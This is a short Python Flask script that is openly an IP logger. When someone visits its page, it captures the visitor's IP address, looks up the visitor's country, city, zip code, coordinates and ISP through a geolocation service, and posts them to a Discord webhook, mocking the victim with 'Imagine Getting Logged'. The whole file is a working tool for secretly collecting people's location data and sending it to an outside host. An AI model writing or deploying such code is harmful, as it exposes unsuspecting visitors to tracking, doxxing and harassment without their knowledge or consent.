import requests, json
from flask import Flask, request
webid = ""
webtoken = ""
app = Flask(__name__)


@app.route("/")
def home():
    ip = request.headers.getlist('X-Forwarded-For')[0]
    geo = json.loads(requests.get(f"http://ip-api.com/json/{ip}").text)
    requests.post(f"https://discord.com/api/v10/webhooks/{webid}/{webtoken}",
                  json= {
                            "content": "@everyone",
                            "embeds": [
                                {
                                    "title": "IP LOGGED",
                                    "description":f"IP: `{ip}`\nCountry: `{geo['country']}`\nCountry Code: `{geo['countryCode']}`\nRegion: `{geo['region']}`\nRegion Name: `{geo['regionName']}`\nCity: `{geo['city']}`\nZip: `{geo['zip']}`\nLatitude: `{geo['lat']}`\nLongitude: `{geo['lon']}`\nTimezone: `{geo['timezone']}`\nISP: `{geo['isp']}`\nOrg: `{geo['org']}`\nAs: `{geo['as']}`",
                                    "color": 5763719,
                                    "footer": {"text": "IP LOGGER BY wiz#7777 | https://github.com/mxte"}
                                    
                                }
                                ]
                         })
    return "<h1>Imagine Getting Logged</h1>"
